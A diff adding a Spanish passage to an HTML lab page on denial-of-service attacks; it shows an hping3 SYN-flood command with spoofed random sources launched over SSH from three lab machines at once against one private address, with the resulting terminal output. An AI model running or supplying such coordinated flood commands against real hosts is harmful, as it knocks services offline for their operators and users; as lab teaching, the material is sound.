@@ -111,6 +111,29 @@
               wait <br>
             </code>
 
+            <p>En la salida del script se puede observar la ejecución correcta de la instalación de hping</p>
+
+            <br>
+            <p>Ahora, se modifica el mismo script para ejecutar hping en todos los destinos</p>
+            <p>Esto unicamente consiste en reemplazar la variable $command con el comando de hping a ejecutar. El comando a utilizar es el mismo del ataque DoS</p>
+            <code>hping3 --rand-source --flood 10.21.1.11</code>
+            <br>
+            <p>Al ejecutar el ataque DDoS se obtiene la siguiente salida</p>
+            <code>
+              root@dlc:~# bash remote_command.sh <br>
+              spawn ssh root@10.21.1.102 hping3 --rand-source --flood 10.21.1.11 <br>
+              spawn ssh root@10.21.1.101 hping3 --rand-source --flood 10.21.1.11 <br>
+              spawn ssh root@10.21.1.103 hping3 --rand-source --flood 10.21.1.11 <br>
+              root@10.21.1.102's password: <br>
+              root@10.21.1.101's password: <br>
+              root@10.21.1.103's password: <br>
+              hping in flood mode, no replies will be shown <br>
+              hping in flood mode, no replies will be shown <br>
+              hping in flood mode, no replies will be shown <br>
+            </code>
+            <p>Con esto, claramente se estan corriendo tres ataques al mismo tiempo</p>
+            <img src="/img/ddos.png" alt="Colasoft initial page" style="max-width: 70vw;">
+            
         </div>
         <!-- <div class="w3-third w3-container">
             <p class="w3-border w3-padding-large w3-padding-32 w3-center">AD</p>
